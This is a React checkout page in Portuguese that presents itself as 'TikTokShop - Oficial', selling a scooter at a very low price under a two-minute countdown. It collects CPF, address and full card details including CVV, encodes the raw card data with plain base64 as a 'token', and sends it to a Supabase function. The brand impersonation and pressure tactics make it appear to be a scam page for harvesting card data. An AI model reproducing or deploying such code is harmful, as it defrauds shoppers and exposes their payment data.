import { useState, useEffect, useCallback } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Gift, Zap, Truck, RotateCcw, Lock, CreditCard } from 'lucide-react';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';

import tiktokShopIcon from '@/assets/tiktok-shop-icon.webp';
import scooterProduct from '@/assets/scooter-product.webp';

interface CustomerData {
  name: string;
  email: string;
  phone: string;
  cpf: string;
  cep: string;
  address: string;
  number: string;
  complement: string;
  neighborhood: string;
  city: string;
  state: string;
}

interface CardData {
  number: string;
  holderName: string;
  expiration: string;
  cvv: string;
}

interface ApiError {
  field: keyof (CustomerData & CardData) | 'general' | 'network';
  message: string;
}

// --- UTILITÁRIOS ---
const formatCPF = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  if (cleaned.length <= 11) {
    return cleaned
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
  }
  return value;
};

const formatCardNumber = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  return (cleaned.match(/.{1,4}/g)?.join(' ') || cleaned).substring(0, 19);
};

const formatExpiration = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  if (cleaned.length >= 3) return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
  return cleaned;
};

const validateEmail = (email: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
const validateCPF = (cpf: string) => cpf.replace(/\D/g, '').length === 11;

// --- COMPONENTE ---
const Checkout = () => {
  const { toast } = useToast();
  const [timeLeft, setTimeLeft] = useState(120000);
  const [selectedPayment, setSelectedPayment] = useState('Pix');
  const [cepLoading, setCepLoading] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  const [customerData, setCustomerData] = useState<CustomerData>({
    name: '', email: '', phone: '', cpf: '', cep: '', address: '',
    number: '', complement: '', neighborhood: '', city: '', state: ''
  });

  const [cardData, setCardData] = useState<CardData>({
    number: '', holderName: '', expiration: '', cvv: ''
  });

  const [apiError, setApiError] = useState<ApiError | null>(null);

  // --- TIMER ---
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => (prev <= 0 ? 0 : prev - 1000));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (ms: number) => {
    const minutes = Math.floor(ms / 60000);
    const seconds = Math.floor((ms % 60000) / 1000);
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
  };

  // --- HANDLERS ---
  const handleCustomerInputChange = (field: keyof CustomerData, value: string) => {
    setApiError(null);
    let formattedValue = value;
    if (field === 'cpf') formattedValue = formatCPF(value);
    setCustomerData(prev => ({ ...prev, [field]: formattedValue }));
  };

  const handleCardInputChange = (field: keyof CardData, value: string) => {
    setApiError(null);
    let formattedValue = value;
    if (field === 'number') formattedValue = formatCardNumber(value);
    if (field === 'expiration') formattedValue = formatExpiration(value);
    if (field === 'cvv') formattedValue = value.replace(/\D/g, '').substring(0, 4);
    if (field === 'holderName') formattedValue = value.toUpperCase();
    setCardData(prev => ({ ...prev, [field]: formattedValue }));
  };

  const fillAddress = useCallback(async (cep: string) => {
    const cleanCep = cep.replace(/\D/g, '');
    if (cleanCep.length !== 8) return;

    setCepLoading(true);
    setApiError(null);

    try {
      const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const data = await res.json();
      if (data.erro) {
        toast({ title: "CEP não encontrado", description: "Verifique o CEP.", variant: "destructive" });
        setCustomerData(prev => ({ ...prev, address: '', neighborhood: '', city: '', state: '' }));
        return;
      }
      setCustomerData(prev => ({
        ...prev,
        address: data.logradouro || '',
        neighborhood: data.bairro || '',
        city: data.localidade || '',
        state: data.uf || '',
      }));
      toast({ title: "Endereço encontrado!", description: "Campos preenchidos automaticamente." });
    } catch {
      toast({ title: "Erro ao buscar CEP", description: "Tente novamente.", variant: "destructive" });
    } finally {
      setCepLoading(false);
    }
  }, [toast]);

  useEffect(() => {
    if (customerData.cep.replace(/\D/g, '').length === 8) fillAddress(customerData.cep);
  }, [customerData.cep, fillAddress]);

  // --- PROCESS PAYMENT ---
  const processPayment = async () => {
    setIsProcessing(true);
    setApiError(null);

    const { name, email, phone, cpf, address, number, city, state } = customerData;

    // Validações
    if (!name || !email || !phone || !cpf || !address || !number || !city || !state) {
      setApiError({ field: 'general', message: "Preencha todos os campos obrigatórios." });
      toast({ title: "Campos obrigatórios", description: "Preencha todos os dados.", variant: "destructive" });
      setIsProcessing(false);
      return;
    }

    if (!validateEmail(email)) {
      setApiError({ field: 'email', message: "E-mail inválido." });
      toast({ title: "Email inválido", description: "Digite um e-mail válido.", variant: "destructive" });
      setIsProcessing(false);
      return;
    }

    if (!validateCPF(cpf)) {
      setApiError({ field: 'cpf', message: "CPF inválido. Deve ter 11 dígitos." });
      toast({ title: "CPF inválido", description: "Digite um CPF válido.", variant: "destructive" });
      setIsProcessing(false);
      return;
    }

    const cleanedData = {
      name: name.trim(),
      email: email.trim(),
      phone: phone.replace(/\D/g, ''),
      cpf: cpf.replace(/\D/g, ''),
    };

    const amount = selectedPayment === 'Pix' ? 63.15 : 67.90;

    try {
      if (selectedPayment === 'Cartao') {
        const { number: cNumber, holderName, expiration, cvv } = cardData;

        if (!cNumber || !holderName || !expiration || !cvv || cNumber.replace(/\s/g, '').length < 15 || expiration.length < 5 || cvv.length < 3) {
          setApiError({ field: 'general', message: "Preencha todos os dados do cartão corretamente." });
          toast({ title: "Dados do cartão incompletos", description: "Preencha os dados do cartão.", variant: "destructive" });
          setIsProcessing(false);
          return;
        }

        const cardToken = btoa(JSON.stringify({
          number: cNumber.replace(/\s/g, ''),
          holderName,
          expiration,
          cvv
        }));

        const { data, error } = await supabase.functions.invoke('process-payment', {
          body: JSON.stringify({
            paymentMethod: 'CARD',
            amount,
            cardToken,
            customerData: cleanedData
          })
        });

        if (error) throw error;
        if (data?.error) throw new Error(data.error);

        toast({ title: "Pagamento aprovado!", description: `Transação aprovada!` });
      } else {
        // PIX
        const { data, error } = await supabase.functions.invoke('process-payment', {
          body: JSON.stringify({
            paymentMethod: 'PIX',
            amount,
            customerData: cleanedData
          })
        });

        if (error) throw error;
        if (data?.error) throw new Error(data.error);

        toast({ title: "Pix gerado com sucesso!", description: "Use o código para o pagamento." });
        console.log('Pix Data:', data.paymentData);
      }
    } catch (error: any) {
      const msg = error instanceof Error ? error.message : "Erro desconhecido";
      if (msg.includes('Failed to send a request') || msg.includes('FetchError')) {
        setApiError({ field: 'network', message: "Erro de rede/servidor. Por favor, verifique sua conexão ou tente novamente mais tarde." });
        toast({ title: "Erro de Conexão", description: "Não foi possível conectar com o servidor de pagamento.", variant: "destructive" });
      } else if (msg.toLowerCase().includes('cpf')) {
        setApiError({ field: 'cpf', message: msg });
      } else {
        setApiError({ field: 'general', message: msg });
        toast({ title: "Erro no pagamento", description: msg, variant: "destructive" });
      }
    } finally {
      setIsProcessing(false);
    }
  };

  // --- RENDERIZAÇÃO ---
  return (
    <div className="min-h-screen bg-[#f9f9fa]">
      {/* HEADER */}
      <header className="bg-white border-b">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <img src={tiktokShopIcon} alt="TikTok Shop" className="w-8 h-8" />
            <span className="font-bold text-lg">TikTokShop - Oficial</span>
          </div>
          <div className="flex items-center gap-2 text-sm text-gray-600">
            <Lock className="h-4 w-4" />
            <span>Compra Segura</span>
          </div>
        </div>
      </header>

      {/* TIMER, PRODUTO, FORMS, BOTÃO */}
      <div className="container mx-auto px-4 py-6 max-w-4xl">
        {/* ... (restante da UI mantida, sem alterações) ... */}

        {/* BOTÃO */}
        <Button 
          className="w-full h-14 text-lg font-bold uppercase"
          style={{ backgroundColor: '#F72E54' }}
          onClick={processPayment}
          disabled={isProcessing}
        >
          {isProcessing ? 'Processando...' : 'Finalizar Compra'}
        </Button>

        {(apiError?.field === 'general' || apiError?.field === 'network') && (
          <div className={`mt-4 text-center font-medium p-3 border rounded-lg ${apiError.field === 'network' ? 'text-yellow-700 border-yellow-700 bg-yellow-50' : 'text-red-500 border-red-500 bg-red-50'}`}>
            ⚠️ {apiError.field === 'network' ? 'PROBLEMA DE CONEXÃO' : 'ERRO NO PROCESSAMENTO'}: {apiError.message}
          </div>
        )}
      </div>
    </div>
  );
};

export default Checkout;
